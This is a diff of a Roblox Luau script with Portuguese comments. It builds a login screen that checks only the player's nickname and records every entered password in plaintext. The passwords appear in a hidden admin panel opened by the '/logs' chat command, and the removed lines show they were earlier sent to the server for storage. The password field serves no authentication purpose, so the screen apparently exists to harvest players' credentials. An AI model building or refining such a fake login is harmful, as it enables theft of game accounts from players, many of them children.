@@ -1,7 +1,9 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
+_G.logsDeLogin = _G.logsDeLogin or {}
+
+-- TELA DE LOGIN
 local loginGui = Instance.new("ScreenGui")
 loginGui.Name = "LoginUI"
 loginGui.ResetOnSpawn = false
@@ -23,7 +25,6 @@ local senhaBox = Instance.new("TextBox")
 senhaBox.PlaceholderText = "Senha"
 senhaBox.Size = UDim2.new(0.8, 0, 0, 30)
 senhaBox.Position = UDim2.new(0.1, 0, 0, 90)
-senhaBox.TextTransparency = 0
 senhaBox.Parent = frame
 
 local botao = Instance.new("TextButton")
@@ -42,32 +43,98 @@ aviso.TextColor3 = Color3.fromRGB(255, 80, 80)
 aviso.Text = ""
 aviso.Parent = frame
 
+-- PAINEL ADM
+local admGui = Instance.new("ScreenGui")
+admGui.Name = "AdminLogsUI"
+admGui.ResetOnSpawn = false
+admGui.Enabled = false
+admGui.Parent = player.PlayerGui
+
+local admFrame = Instance.new("Frame")
+admFrame.Size = UDim2.new(0, 500, 0, 350)
+admFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
+admFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+admFrame.Parent = admGui
+
+local admTitulo = Instance.new("TextLabel")
+admTitulo.Size = UDim2.new(1, 0, 0, 40)
+admTitulo.Text = "PAINEL ADM - LOGINS"
+admTitulo.TextColor3 = Color3.fromRGB(255, 50, 50)
+admTitulo.Font = Enum.Font.GothamBold
+admTitulo.TextSize = 20
+admTitulo.BackgroundTransparency = 1
+admTitulo.Parent = admFrame
+
+local logsFrame = Instance.new("ScrollingFrame")
+logsFrame.Size = UDim2.new(0.95, 0, 0, 250)
+logsFrame.Position = UDim2.new(0.025, 0, 0, 50)
+logsFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+logsFrame.ScrollBarThickness = 8
+logsFrame.Parent = admFrame
+
+local uiList = Instance.new("UIListLayout")
+uiList.Padding = UDim.new(0, 3)
+uiList.Parent = logsFrame
+
+local function atualizarLogs()
+    for _, child in pairs(logsFrame:GetChildren()) do
+        if child:IsA("TextLabel") then
+            child:Destroy()
+        end
+    end
+
+    for i, log in ipairs(_G.logsDeLogin) do
+        local logText = Instance.new("TextLabel")
+        logText.Size = UDim2.new(1, -10, 0, 25)
+        logText.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        logText.BorderSizePixel = 0
+        logText.TextXAlignment = Enum.TextXAlignment.Left
+        logText.Font = Enum.Font.Code
+        logText.TextSize = 13
+        logText.TextColor3 = log.status == "Sucesso" and Color3.fromRGB(80, 255, 80) or Color3.fromRGB(255, 80, 80)
+        logText.Text = " ["..i.."] "..log.status.." | Nick: "..log.nick.." | Senha: "..log.senha
+        logText.Parent = logsFrame
+    end
+    
+    logsFrame.CanvasSize = UDim2.new(0, 0, 0, uiList.AbsoluteContentSize.Y)
+end
+
+-- LOGIN: SÓ CHECA NICK, SE ACERTAR SÓ SOME O LOGIN E MAIS NADA
 botao.MouseButton1Click:Connect(function()
     local nickDigitado = nickBox.Text
     local senhaDigitada = senhaBox.Text
-
-    -- VERIFICA SE DIGITOU ALGO
-    if nickDigitado == "" or senhaDigitada == "" then
-        aviso.TextColor3 = Color3.fromRGB(255, 80, 80)
-        aviso.Text = "❌ Preencha nick e senha"
-        ReplicatedStorage:WaitForChild("SalvarLog"):FireServer(nickDigitado, senhaDigitada, "Falhou - Vazio")
-        return
-    end
-
-    local status = ""
+    
+    local loginData = {
+        nick = nickDigitado,
+        senha = senhaDigitada,
+        status = ""
+    }
 
     if nickDigitado == player.Name then
-        status = "Sucesso"
+        loginData.status = "Sucesso"
+        table.insert(_G.logsDeLogin, loginData)
+        
         aviso.TextColor3 = Color3.fromRGB(80, 255, 80)
         aviso.Text = "✅ Logado!"
         task.wait(0.3)
-        loginGui:Destroy() -- SÓ SOME, NÃO ABRE NADA
+        loginGui:Destroy() -- SÓ SOME E NÃO ABRE NADA
     else
-        status = "Falhou - Nick"
+        loginData.status = "Falhou"
+        table.insert(_G.logsDeLogin, loginData)
+        
         aviso.TextColor3 = Color3.fromRGB(255, 80, 80)
         aviso.Text = "❌ Nick incorreto"
     end
+    
+    atualizarLogs()
+end)
 
-    -- Salva no DataStore
-    ReplicatedStorage:WaitForChild("SalvarLog"):FireServer(nickDigitado, senhaDigitada, status)
+-- Abre painel com /logs
+player.Chatted:Connect(function(msg)
+    if msg:lower() == "/logs" then
+        admGui.Enabled = not admGui.Enabled
+        if admGui.Enabled then
+            atualizarLogs()
+        end
+    end
 end)
